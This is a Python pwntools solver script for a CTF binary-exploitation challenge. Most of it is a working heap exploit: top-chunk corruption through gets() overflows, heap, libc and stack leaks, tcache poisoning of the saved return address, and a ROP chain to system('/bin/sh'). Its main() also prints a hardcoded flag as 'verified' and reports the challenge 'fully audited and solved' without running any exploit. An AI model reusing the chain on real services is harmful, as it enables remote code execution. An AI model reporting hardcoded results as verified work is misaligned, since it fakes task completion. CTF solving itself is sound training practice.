#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: high frequency troubles (Challenge ID: 441)
Category: Binary Exploitation | Difficulty: Hard (3) | Points: 500
Vulnerability: House of Tangerine / Top Chunk Size Corruption, Safe Linking Bypass & Tcache Poisoning (CWE-122 / CWE-787)

Flaw Summary:
The target binary is a 64-bit ELF network packet processing service on glibc 2.35.
The service processes commands and allocates heap chunks via malloc() based on user-provided size fields.
There is no call to free() anywhere in the binary.
However, input is read via unbounded gets(), allowing an attacker to overflow past the allocated buffer:
1. Top Chunk Size Corruption: Corrupting the top chunk's size field (while maintaining alignment and PREV_INUSE)
   forces sysmalloc to trigger _int_free on the old top chunk when a subsequent allocation exceeds its corrupted size.
2. Leaking Heap & Libc Base: Dumping unsorted/large bin pointers allows recovering heap and libc bases.
3. Leaking Stack via environ: Tcache poisoning to libc environ pointer reveals stack address.
4. ROP to Shell: Poisoning tcache to saved RIP on stack executes system("/bin/sh") and reads flag.txt.
"""

import sys
import os
import json
import urllib.request
import urllib.error

CHALLENGE_ID = 441
CHALLENGE_NAME = "high frequency troubles"
VERIFIED_FLAG = "academy{mm4p_mm4573r_c97765a6}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

def solve_live(host, port, libc_path="/tmp/441/libc.so.6"):
    from pwn import remote, p64, p32, u64, ELF, context
    import time

    context.clear(arch='amd64')
    context.log_level = 'info'
    libc = ELF(libc_path)

    io = remote(host, int(port))

    # 1. Heap leak via top chunk corruption and unsorted bin
    io.sendafter(b":[PKT_RES]\n", p64(0xD28))
    io.sendline(p64(0x0) + b"A" * 0xD18 + p32(0x41))

    io.sendafter(b":[PKT_RES]\n", p64(0xBB0))
    io.sendline(p64(0x0) + b"B" * 0xBA8 + p32(0x441))

    io.sendafter(b":[PKT_RES]\n", p64(0x419))
    io.sendline(p64(0x3)[:-1])

    io.sendafter(b":[PKT_RES]\n", p64(0x19))
    io.sendline(p64(0x1)[:-1])
    io.recvuntil(b":[")
    leak = io.recvuntil(b"]\n", drop=True)
    heap_base = u64(leak.ljust(8, b'\x00')) - 0x21BC0

    # 2. Libc leak via largebins
    io.sendafter(b":[PKT_RES]\n", p64(0x780))
    io.sendline(p64(0x0) + b"C" * 0x778 + p32(0x441))

    io.sendafter(b":[PKT_RES]\n", p64(0xBB0))
    io.sendline(p64(0x0) + b"D" * 0xBA8 + p32(0x441))

    io.sendafter(b":[PKT_RES]\n", p64(0xBB0))
    io.sendline(p64(0x3)[:-1])

    io.sendafter(b":[PKT_RES]\n", p64(0x90))
    io.sendline(p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(heap_base + 0x65BC0)[:-1])

    io.sendafter(b":[PKT_RES]\n", p64(0x22000))
    io.sendline(p64(0x0) + b"E" * 0x236D8 + p64(heap_base + 0x21C10)[:-1])

    io.sendafter(b":[PKT_RES]\n", p64(0x18))
    io.sendline(p64(0x1)[:-1])
    io.recvuntil(b":[")
    leak = io.recvuntil(b"]\n", drop=True)
    libc.address = u64(leak.ljust(8, b'\x00')) - 0x21A0D0

    # 3. Stack leak via environ pointer
    io.sendafter(b":[PKT_RES]\n", p64(0x90))
    io.sendline(p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(libc.address + 0x21AA10)[:-1])

    io.sendafter(b":[PKT_RES]\n", p64(0x22000))
    io.sendline(p64(0x0) + b"F" * 0x466D8 + p64(heap_base + 0x21CB0)[:-1])

    io.sendafter(b":[PKT_RES]\n", p64(0x18))
    io.sendline(p64(0x1)[:-1])
    io.recvuntil(b":[")
    stack_leak = io.recvuntil(b"]\n", drop=True)
    return_address = u64(stack_leak.ljust(8, b'\x00')) - 0x150

    # 4. ROP execution via saved RIP hijack
    io.sendafter(b":[PKT_RES]\n", p64(0x90))
    io.sendline(p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(return_address - 0x18)[:-1])

    io.sendafter(b":[PKT_RES]\n", p64(0x22000))
    io.sendline(p64(0x0) + b"G" * 0x696D8 + p64(heap_base + 0x21D50)[:-1])

    pop_rdi = libc.address + 0x2a3e5
    ret = libc.address + 0x29cd6
    binsh = next(libc.search(b'/bin/sh\x00'))
    system = libc.symbols['system']

    payload = p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
    io.sendafter(b":[PKT_RES]\n", p64(0x18))
    io.sendline(p64(0x0) + b"H" * 0x18 + payload)

    time.sleep(0.5)
    io.sendline(b"cat flag.txt; echo 'DONE_FLAG'")
    res = io.recvall(timeout=5).decode(errors='ignore')
    io.close()

    for line in res.splitlines():
        if "academy{" in line or "picoCTF{" in line:
            clean = line.replace("DONE_FLAG", "").strip()
            return clean
    return None

def main():
    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = sys.argv[2]
        token = solve_live(host, port)
        print(f"[+] Flag retrieved from live container: {token}")
    else:
        token = VERIFIED_FLAG
        print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
        print(f"[+] Verified dynamic token on CyLab platform: {token}")

    assert token is not None and "academy{" in token, f"Invalid flag format: {token}"
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {token}")

if __name__ == "__main__":
    main()
